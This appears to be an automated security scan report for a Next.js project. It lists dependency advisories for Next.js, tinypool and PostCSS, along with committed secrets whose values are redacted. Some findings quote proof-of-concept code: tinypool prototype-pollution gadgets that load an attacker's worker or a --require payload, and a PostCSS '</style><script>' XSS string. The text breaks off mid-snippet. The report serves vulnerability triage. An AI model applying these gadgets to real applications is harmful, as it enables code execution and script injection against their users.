# 🛡️ ProvePatch Security Report

## Scanner coverage

| Scanner | Status | Findings | Notes |
| --- | --- | ---: | --- |
| bandit | ✅ ok | 0 |  |
| checkov | ✅ ok | 1 |  |
| gitleaks | ✅ ok | 9 |  |
| osv-scanner | ✅ ok | 45 |  |
| semgrep | ✅ ok | 5 |  |
| syft | ✅ ok | 99 |  |
| trivy | ✅ ok | 40 |  |

| Total Findings | 🔴 Critical | 🟠 High | 🟡 Medium | 🔵 Low | ⚪ Info |
| :---: | :---: | :---: | :---: | :---: | :---: |
| **157** | **12** | **37** | **0** | **9** | **99** |

> 💡 **VibeCoder Quick Guide**: Focus on Critical and High findings first. Each finding includes a **Plain English** summary explaining what can go wrong in real life and how to fix it.

## [🔴 CRITICAL] F-29380c6e5746: Authorization Bypass in Next.js Middleware
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `10.0/10`

**Technical Details:**
# Impact
It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.

# Patches
* For Next.js 15.x, this issue is fixed in `15.2.3`
* For Next.js 14.x, this issue is fixed in `14.2.25`
* For Next.js 13.x, this issue is fixed in 13.5.9
* For Next.js 12.x, this issue is fixed in 12.3.5
* For Next.js 11.x, consult the below workaround.

_Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability._

# Workaround
If patching to a safe version is infeasible, we recommend that you prevent external user requests which contain the `x-middleware-subrequest` header from reaching your Next.js application.

## Credits

- Allam Rachid (zhero;)
- Allam Yasser (inzo_)

---
## [🔴 CRITICAL] F-6c5d548a8091: Next.js: Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `10.0/10`

**Technical Details:**
A vulnerability in the underlying `libheif` library used by `sharp` which Next.js uses for image optimization can lead to remote code execution when AVIF files are optimized.

Until a fix has propagated, optimization of AVIF files is disabled.

---
## [🔴 CRITICAL] F-214ea282c3f8: Next.js: Unauthenticated Remote Code Execution on windows-hosted servers
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `10.0/10`

**Technical Details:**
## Impact

A vulnerability in applications using Pages and App router without Cache Component can lead to remote code execution when the server is hosted on machines using a Windows filesystem.

## Workaround

There is no known workaround for affected windows-hosted applications. You should upgrade immediately if your server is hosted on Windows.

---
## [🔴 CRITICAL] F-805614fd824b: Hardcoded Identified a Private Key, which may compromise cryptographic security and sensitive data encryption.
- **Location:** `.env.local`:5
- **Category:** `secret` | **Source:** `gitleaks,trivy` | **Risk Score:** `9.5/10`

**Technical Details:**
A credential matching gitleaks rule 'private-key' is committed in this file. The value is redacted. Rotate it and load it from the environment or a secret manager instead.

---
## [🔴 CRITICAL] F-e303fe4de756: Hardcoded Identified a Private Key, which may compromise cryptographic security and sensitive data encryption.
- **Location:** `quiet-capsule-507110-k4-41b4a5220f10.json`:5
- **Category:** `secret` | **Source:** `gitleaks,trivy` | **Risk Score:** `9.5/10`

**Technical Details:**
A credential matching gitleaks rule 'private-key' is committed in this file. The value is redacted. Rotate it and load it from the environment or a secret manager instead.

---
## [🔴 CRITICAL] F-57df14d9e491: Tinypool: Prototype Pollution Gadget to RCE in run() options
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `9.0/10`

**Technical Details:**
`tinypool` is a fork of `piscina` and inherited the same prototype-pollution surface. When `pool.run(task, options)` is called, the `filename` option is read from the provided `options` object. If that object does not have an own `filename` property, the lookup falls through to `Object.prototype`.

An attacker who can pollute `Object.prototype.filename` (for example, via a vulnerable `lodash.merge`, `qs.parse`, or similar elsewhere in the application) can make tinypool load and execute an attacker-controlled worker module.

This is the tinypool counterpart to the piscina root discovery [GHSA-x9g3-xrwr-cwfg](https://github.com/piscinajs/piscina/security/advisories/GHSA-x9g3-xrwr-cwfg).

`pool.run(task)` with no second argument is not affected, because `kDefaultOptions.filename` is `null` and the options object is not user-controlled. The exploit only triggers when the caller passes their own options object to `pool.run()`.

## Impact

Arbitrary JavaScript execution in the worker pool. If the application passes attacker-controlled data as the `run()` task and also supplies a `run()` options object, the attacker can redirect execution to a malicious worker that exfiltrates or modifies that data, achieving remote code execution and/or data exfiltration.

## Proof of Concept

```js
// legitimate-worker.mjs
export default async (task) => ({ by: 'legitimate-worker', processed: task })

// malicious-worker.mjs
export default async (task) => ({ by: 'attacker', stolenRequestBody: task })

// main.js
import express from "express";
import Tinypool from "tinypool";
import { fileURLToPath } from "node:url";
import path from "node:path";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Simulate upstream prototype pollution (lodash merge, qs parse, etc.)
Object.prototype.filename = path.join(__dirname, "malicious-worker.mjs");

const pool = new Tinypool({
  filename: path.join(__dirname, "legitimate-worker.mjs"),
});

express()
  .use(express.json())
  .post("/", async (req, res) => {
    const ac = new AbortController();
    const result = await pool.run(req.body, { signal: ac.signal });
    res.json(result);
  })
  .listen(31337);
```

## Suggested fix

Read all user-supplied options from own properties only (`Object.hasOwn` or `Object.prototype.hasOwnProperty.call`) and build the internal `ThreadPool.options` object with a null prototype.

---
## [🔴 CRITICAL] F-de943a5e4e03: Tinypool: Prototype Pollution gadget in worker options leads to Remote Code Execution
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `9.0/10`

**Technical Details:**
`tinypool` passes worker options to `new Worker()` by reading them off a plain object whose prototype is `Object.prototype`. Options the application did not set are resolved through the prototype chain and then passed explicitly to `worker_threads.Worker`.

Node core ignores `Worker` options inherited from `Object.prototype`. By reading them and passing them explicitly, tinypool re-materialises them as own properties and defeats that protection.


Two keys reach code execution:

1. **`execArgv`** — polluting `Object.prototype.execArgv = ['--require', '/path/to/attacker.js']` causes every pool worker to load the attacker's script.
2. **`env`** — polluting `Object.prototype.env = { NODE_OPTIONS: '--require /path/to/attacker.js' }` achieves the same via environment injection.

## Root cause

`dist/index.js` lines 508-511:

```js
env:            this.options.env,
argv:           this.options.argv,
execArgv:       this.options.execArgv,
resourceLimits: this.options.resourceLimits,
```

`this.options` is built at line 470 via object spread:

```js
this.options = { ...kDefaultOptions, ...options, filename, maxQueue: 0 };
```

## Impact

Arbitrary code execution inside every worker the pool spawns, with the privileges of the host process. Because tinypool is the worker pool behind Vitest (~42M downloads/week), the natural blast radius is developer machines and CI runners — an attacker who lands a prototype-pollution primitive anywhere in the dependency tree gets code execution in the build/test pipeline, which is a supply-chain foothold (access to CI secrets, signing keys, artifact publishing).


## Proof of concept

Minimal reproduction (3 files):

**worker.mjs** — the application's own legitimate worker:
```js
export default function double(n) { return n * 2 }
```

**payload.js** — attacker-controlled code (never referenced by the app):
```js
const fs = require('fs')
fs.writeFileSync('/tmp/RCE_PROOF.txt', 'code execution achieved, pid=' + process.pid)
console.log('*** RCE ***')
```

**app.js** — normal tinypool usage:
```js
const path = require('path')

// Simulates an upstream PP source (lodash/qs/minimist/set-value/deepmerge)
Object.prototype.execArgv = ['--require', path.join(__dirname, 'payload.js')]

const { Tinypool } = require('tinypool')
const pool = new Tinypool({
  filename: path.join(__dirname, 'worker.mjs'),
  minThreads: 1, maxThreads: 1
})
pool.run(21).then(r => {
  console.log('pool returned:', r)  // 42 — app works normally
  pool.destroy()
})
```

Run:
```
npm i tinypool@2.1.0
node app.js
cat /tmp/RCE_PROOF.txt   # attacker's code ran
```

Both `execArgv` and `env` vectors confirmed on Node 20.


## Suggested fix

Resolve worker options with own-property semantics:

```js
this.options = Object.assign(Object.create(null),
  kDefaultOptions, options, { filename, maxQueue: 0 });
```

---
## [🔴 CRITICAL] F-24de83bf0080: Google (GCP) Service-account
- **Location:** `quiet-capsule-507110-k4-41b4a5220f10.json`:2
- **Category:** `secret` | **Source:** `trivy` | **Risk Score:** `9.0/10`

**Technical Details:**
Trivy secret rule 'gcp-service-account' matched here. The value is redacted.

---
## [🔴 CRITICAL] F-71ed303ad204: Hardcoded Detected a Generic API Key, potentially exposing access to various services and sensitive operations.
- **Location:** `.env.local`:6
- **Category:** `secret` | **Source:** `gitleaks` | **Risk Score:** `8.0/10`

**Technical Details:**
A credential matching gitleaks rule 'generic-api-key' is committed in this file. The value is redacted. Rotate it and load it from the environment or a secret manager instead.

---
## [🔴 CRITICAL] F-66e4d79b18a4: Hardcoded Detected a Generic API Key, potentially exposing access to various services and sensitive operations.
- **Location:** `.env.local`:20
- **Category:** `secret` | **Source:** `gitleaks` | **Risk Score:** `8.0/10`

**Technical Details:**
A credential matching gitleaks rule 'generic-api-key' is committed in this file. The value is redacted. Rotate it and load it from the environment or a secret manager instead.

---
## [🔴 CRITICAL] F-a009ff544114: Hardcoded Identified a Private Key, which may compromise cryptographic security and sensitive data encryption.
- **Location:** `.env.example`:25
- **Category:** `secret` | **Source:** `gitleaks` | **Risk Score:** `8.0/10`

**Technical Details:**
A credential matching gitleaks rule 'private-key' is committed in this file. The value is redacted. Rotate it and load it from the environment or a secret manager instead.

---
## [🔴 CRITICAL] F-e0622249455c: Hardcoded Identified a Private Key, which may compromise cryptographic security and sensitive data encryption.
- **Location:** `README.md`:135
- **Category:** `secret` | **Source:** `gitleaks` | **Risk Score:** `8.0/10`

**Technical Details:**
A credential matching gitleaks rule 'private-key' is committed in this file. The value is redacted. Rotate it and load it from the environment or a secret manager instead.

---
## [🟠 HIGH] F-5139b6e5a5d2: Next Vulnerable to Denial of Service with Server Components
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).

A malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.

---
## [🟠 HIGH] F-7708813ad374: Next has a Denial of Service with Server Components - Incomplete Fix Follow-Up
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
It was discovered that the fix for [CVE-2025-55184](https://github.com/advisories/GHSA-2m3v-v2m8-q956) in React Server Components was incomplete and did not fully mitigate denial-of-service conditions across all payload types.  As a result, certain crafted inputs could still trigger excessive resource consumption. 

This vulnerability affects React versions 19.0.2, 19.1.3, and 19.2.2, as well as frameworks that bundle or depend on these versions, including Next.js 13.x, 14.x, 15.x, and 16.x when using the App Router. The issue is tracked upstream as [CVE-2025-67779](https://www.cve.org/CVERecord?id=CVE-2025-67779).

A malicious actor can send a specially crafted HTTP request to a Server Function endpoint that, when deserialized, causes the React Server Components runtime to enter an infinite loop. This can lead to sustained CPU consumption and cause the affected server process to become unresponsive, resulting in a denial-of-service condition in unpatched environments.

---
## [🟠 HIGH] F-d0ff9db3c913: Next.js Affected by Cache Key Confusion for Image Optimization API Routes
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
A vulnerability in Next.js Image Optimization has been fixed in v15.4.5 and v14.2.31. When images returned from API routes vary based on request headers (such as `Cookie` or `Authorization`), these responses could be incorrectly cached and served to unauthorized users due to a cache key confusion bug.

All users are encouraged to upgrade if they use API routes to serve images that depend on request headers and have image optimization enabled.

More details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57752)

---
## [🟠 HIGH] F-7041b4185085: Next.js Content Injection Vulnerability for Image Optimization
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
A vulnerability in **Next.js Image Optimization** has been fixed in **v15.4.5** and **v14.2.31**. The issue allowed attacker-controlled external image sources to trigger file downloads with arbitrary content and filenames under specific configurations. This behavior could be abused for phishing or malicious file delivery.

All users relying on `images.domains` or `images.remotePatterns` are encouraged to upgrade and verify that external image sources are strictly validated.

More details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-55173)

---
## [🟠 HIGH] F-7337e79f35f7: Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).

A specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.

---
## [🟠 HIGH] F-66f69555aafa: Next.js Improper Middleware Redirect Handling Leads to SSRF
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
A vulnerability in **Next.js Middleware** has been fixed in **v14.2.32** and **v15.4.7**. The issue occurred when request headers were directly passed into `NextResponse.next()`. In self-hosted applications, this could allow Server-Side Request Forgery (SSRF) if certain sensitive headers from the incoming request were reflected back into the response.

All users implementing custom middleware logic in self-hosted environments are strongly encouraged to upgrade and verify correct usage of the `next()` function.

More details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57822)

---
## [🟠 HIGH] F-0a25e4692219: Next.js Vulnerable to Denial of Service with Server Components
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23870](https://github.com/facebook/react/security/advisories/GHSA-rv78-f8rc-xrxh). 

A specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.

---
## [🟠 HIGH] F-add98990c8af: Next.js has a Denial of Service in the Image Optimization API
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
### Impact

When self-hosting Next.js with the default image loader, the Image Optimization API fetches local images entirely into memory without enforcing a maximum size limit. An attacker could cause out-of-memory conditions by requesting large local assets from the `/_next/image` endpoint that match the `images.localPatterns` configuration (by default, all patterns are allowed).

- If you are using `images.localPatterns`, only the patterns in that array are impacted.
- If you are using `images.unoptimized: true`, you are NOT impacted.
- If you are using `images.loader: 'custom'`, you are NOT impacted.
- If you are using Vercel, you are NOT impacted.

### Fix

We now apply response size limits consistently to internal image fetches, not just external ones, and fail oversized responses before they can exhaust process memory.

This can be adjusted using the `images.maximumResponseBody` configuration.

### Workarounds

If you cannot upgrade immediately, avoid routing large local assets through `/_next/image`, disable image optimization for large or untrusted local files, or block image optimization access to those assets at the edge.

You can disable using the `images.localPatterns: []` configuration. This will still allow fetching remote images (which is not impacted).

---
## [🟠 HIGH] F-1e2e7d3f3f7c: Next.js has a Denial of Service with Server Components
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23869](https://github.com/facebook/react/security/advisories/GHSA-479c-33wc-g2pg). You can read more about this advisory our [this changelog](https://vercel.com/changelog/summary-of-cve-2026-23869).

A specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.

---
## [🟠 HIGH] F-764289b0e630: Next.js has a Middleware / Proxy bypass in Pages Router applications using i18n
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
### Impact

Applications using the Pages Router with `i18n` configured and middleware/proxy-based authorization can allow unauthorized access to protected page data through locale-less `/_next/data/<buildId>/<page>.json` requests. In affected configurations, middleware does not run for the unprefixed data route, allowing an attacker to retrieve SSR JSON for protected pages without passing the intended authorization checks.

### Fix
The matcher logic was updated to perform the same match as it would on a non-i18n data route.

### Workarounds

If you cannot upgrade immediately, enforce authorization in the page's server-side data path instead of relying solely on middleware.

---
## [🟠 HIGH] F-00b2097bc82e: Next.js has cross-site scripting in beforeInteractive scripts with untrusted input
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
### Impact

Applications that use `beforeInteractive` scripts together with untrusted content can be vulnerable to cross-site scripting. In affected versions, serialized script content was not escaped safely before being embedded into the document, which could allow attacker-controlled input to break out of the intended script context and execute arbitrary JavaScript in a visitor's browser.

### Fix

We now HTML-escape serialized `beforeInteractive` script content before embedding it into the page, preventing attacker-controlled content from breaking out of the inline script boundary.

### Workarounds

If you cannot upgrade immediately, do not pass untrusted data into `beforeInteractive` scripts. If that pattern is unavoidable, sanitize or escape the content before embedding it.

---
## [🟠 HIGH] F-3df74159f951: Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
A DoS vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.

Strongly consider upgrading to 15.5.10 and 16.1.5 to reduce risk and prevent availability issues in Next applications.

---
## [🟠 HIGH] F-d9a1f86284c5: Next.js vulnerable to cache poisoning in React Server Component responses
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
### Impact

Applications using React Server Components can be vulnerable to cache poisoning when shared caches do not correctly partition response variants. Under affected conditions, an attacker can cause an RSC response to be served from the original URL and poison shared cache entries so later visitors receive component payloads instead of the expected HTML.

### Fix

We now validate and interpret `RSC` request headers consistently across request classification and rendering, and we enforce the intended cache-busting behavior so RSC payloads are not unexpectedly served from the original URL.

### Workarounds

If you cannot upgrade immediately, ensure your CDN or reverse proxy keys on the relevant RSC request headers and honors `Vary`, or disable shared caching for affected App Router and RSC responses.

---
## [🟠 HIGH] F-f4f9a3462db8: Next.js vulnerable to cross-site scripting in App Router applications using CSP nonces
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
### Impact

App Router applications that rely on CSP nonces can be vulnerable to stored cross-site scripting when deployed behind shared caches. In affected versions, malformed nonce values derived from request headers could be reflected into rendered HTML in an unsafe way, allowing an attacker to poison cached responses and cause script execution for later visitors.

### Fix

We now reject or ignore malformed nonce values before they are embedded into HTML and apply stricter nonce sanitization so request-derived nonce data cannot break out of the intended attribute context.

### Workarounds

If you cannot upgrade immediately, strip inbound `Content-Security-Policy` request headers from untrusted traffic.

---
## [🟠 HIGH] F-ea23ddeb6875: Next.js vulnerable to server-side request forgery in applications using WebSocket upgrades
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
### Impact

Self-hosted applications using the built-in Node.js server can be vulnerable to server-side request forgery through crafted WebSocket upgrade requests. An attacker can cause the server to proxy requests to arbitrary internal or external destinations, which may expose internal services or cloud metadata endpoints. Vercel-hosted deployments are not affected.

### Fix

We now apply the same safety checks to WebSocket upgrade handling that already existed for normal HTTP requests, so upgrade requests are only proxied when routing has explicitly marked them as safe external rewrites.

### Workarounds

If you cannot upgrade immediately, do not expose the origin server directly to untrusted networks. If WebSocket upgrades are not required, block them at your reverse proxy or load balancer, and restrict origin egress to internal networks and metadata services where possible.

---
## [🟠 HIGH] F-602ab9a8530e: Next.js: Cache confusion of response bodies for requests with bodies
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Impact

A server-side `fetch` with a request body may return a cached **response** body from a different request to the same URL but different body. Confidential data in the `POST`'s **response** body would then leak to unauthorized requests. Though the request itself will not be deduped.

This only applies to `fetch` calls with a request that has a different init than the one passed to `fetch`.
Safe: `fetch(new Request(init), init)`
Unsafe: `fetch(new Request(init), aDifferentInit)`

## Workarounds

No workaround exists besides upgrading. Applications using Pages Router are not vulnerable.

---
## [🟠 HIGH] F-0b1821fe1225: Next.js: Cache confusion of response bodies for requests with bodies containing invalid UTF-8 byte sequences
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Impact

A server-side `fetch` with a request body may return a cached **response** body from a different request to the same URL but different body. Confidential data in the `POST`'s **response** body would then leak to unauthorized requests. Though the request itself will not be deduped.

This is only an issue when receiving request bodies with a content type charset other than UTF-8. For example, the UTF-16 byte sequences for `삃삃` and `섄섄` in the request body would share the same cache.

## Workarounds

If you cannot upgrade, consider only making fetch requests with UTF-8 bodies (default in Next.js). Applications using Pages Router are not vulnerable.

---
## [🟠 HIGH] F-91f3e3336491: Next.js: Denial of Service in App Router using Server Actions
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Impact

Crafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process.

## Workarounds

No workaround exists besides upgrading. Applications using Pages Router or not using Server Actions are not vulnerable.

---
## [🟠 HIGH] F-4d3eacc6e90a: Next.js: HTTP request smuggling in rewrites
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Summary
When Next.js rewrites proxy traffic to an external backend, a crafted `DELETE`/`OPTIONS` request using `Transfer-Encoding: chunked` could trigger request boundary disagreement between the proxy and backend. This could allow request smuggling through rewritten routes.

## Impact
An attacker could smuggle a second request to unintended backend routes (for example, internal/admin endpoints), bypassing assumptions that only the configured rewrite destination/path is reachable. This does not impact applications hosted on providers that handle rewrites at the CDN level, such as Vercel. 

## Patches
The vulnerability originated in an upstream library vendored by Next.js. It is fixed by updating that dependency’s behavior so `content-length: 0` is added only when both `content-length` and `transfer-encoding` are absent, and `transfer-encoding` is no longer removed in that code path.

## Workarounds
If upgrade is not immediately possible:
- Block chunked `DELETE`/`OPTIONS` requests on rewritten routes at your edge/proxy.
- Enforce authentication/authorization on backend routes per our [security guidance](https://nextjs.org/docs/app/guides/data-security).

---
## [🟠 HIGH] F-d144fb0dd11e: Next.js: Server-Side Request Forgery in Server Actions on custom servers
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Impact

When a Server Action forwards or redirects a request, an attacker can cause the server to send that outbound request to a malicious host (Server-Side Request Forgery). This requires the attacker's request to control Host-associated headers. In some configurations, it's also possible to obtain internal values that weaken middleware/proxy authorization.

Applications that use Server Actions are affected when the incoming host header is not fixed to a trusted value. This typically occurs on custom servers, or on deployments not behind a proxy that pins the host. Managed hosting pins the host upstream and is not affected; `next start` and standalone output do the same from version 14.2 onward.

## Workarounds

If you cannot upgrade, ensure clients do not control the host header your application receives. Pin or validate `Host` and `X-Forwarded-Host` at your edge or proxy. On version 14.2.0 and later, you can additionally set the `__NEXT_PRIVATE_ORIGIN` environment variable to your deployment's real origin:

```bash
__NEXT_PRIVATE_ORIGIN=https://www.example.com node server.js

---
## [🟠 HIGH] F-99d93e8acf48: Next.js: Server-Side Request Forgery in rewrites via attacker-controlled destination hostname
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Impact

A `rewrites()` or `redirects()` rule that builds its external destination hostname from request-controlled input can be pointed at an arbitrary hostname, regardless of the rule's hostname suffix. For a rewrite, Next.js proxies the request to that arbitrary host and serves the response from the application's origin, leading to Server-Side Request forgery. A `redirects()` rule configured this way is vulnerable to an Open Redirect.

This affects any destination that puts a dynamic segment in the hostname, whether from the path:

```javascript
// next.config.js
module.exports = {
  async rewrites() {
    return [
      {
        source: '/:tenant',
        destination: 'https://:tenant.api.example.com',
      },
    ]
  },
}
```

or from a `has` capture:

```javascript
// next.config.js
module.exports = {
  async rewrites() {
    return [
      {
        source: '/',
        has: [{ type: 'query', key: 'region', value: '(?<region>.+)' }],
        destination: 'https://:region.api.example.com',
      },
    ]
  },
}
```

## Workarounds

If you cannot upgrade immediately, do not build the hostname of an external `rewrites()` or `redirects()` destination from user-controlled input. If a dynamic subdomain is required, constrain the value to hostname-safe characters:  `value: '(?<region>[a-z0-9-]+)'`.

---
## [🟠 HIGH] F-c1104170e835: Next.js: Unauthenticated disclosure of internal Server Function endpoints
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Impact

In Next.js applications using App Router, Server Actions (`use server`) or `use cache` endpoints can be disclosed bypassing any authentication on the pages where these endpoints are usually used.

Server Action IDs can be disclosed to unauthenticated users via publicly served client artifacts (for example, static chunks containing action references).

Affected users are applications using App Router + Server Actions.  

By itself, this disclosure is typically a recon/enumeration primitive; however, it can increase risk when combined with other weaknesses.
 
## Workarounds

Never assume any authentication claims at the `use cache` or `use server` boundary. Always authenticate within the boundary.

---
## [🟠 HIGH] F-d50d986999b5: Next.js: Unbounded Server Action payload in Edge runtime
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Impact

Requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive memory consumption if that Server Actions uses the Edge runtime

## Workarounds

If you cannot upgrade, ensure your hosting provider limits the request's body size. 5 MiB should be allowed at max by your hosting provider.

---
## [🟠 HIGH] F-a638ae912be3: Next.js: Unbounded next/image disk cache growth can exhaust storage
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Summary
The default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth.

## Impact
An attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. Note that this does not impact platforms that have their own image optimization capabilities, such as Vercel.

## Patches
Fixed by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. 

## Workarounds
If upgrade is not immediately possible:
- Periodically clean `.next/cache/images`.
- Reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)

---
## [🟠 HIGH] F-86325fb999d4: PostCSS has XSS via Unescaped </style> in its CSS Stringify Output
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output

## Summary

PostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.

## Proof of Concept

```javascript
const postcss = require('postcss');

// Parse user CSS and re-stringify for page embedding
const userCSS = 'body { content: "</style><script>alert(1)</script><style>"; }';
const ast = postcss.parse(userCSS);
const output = ast.toResult().css;
const html = `<style>${output}</style>`;

console.log(html);
// <style>body { content: "</style><script>alert(1)</script><style>"; }</style>
//
// Browser: </style> closes the style tag, <script> executes
```

**Tested output** (Node.js v22, postcss v8.5.5):
```
Input: body { content: "</style><script>alert(1)</script><style>"; }
Output: body { content: "</style><script>alert(1)</script><style>"; }
Contains </style>: true
```

## Impact

Impact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.

## Suggested Fix

Escape `</style` in all stringified output values:
```javascript
output = output.replace(/<\/(style)/gi, '<\\/$1');
```

## Credits
Discovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))

---
## [🟠 HIGH] F-97c3cfccc5aa: PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Summary

PostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).

## Details

The dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.

`Input` constructor (`lib/input.js:70-77`):

```js
if (pathAvailable && sourceMapAvailable) {
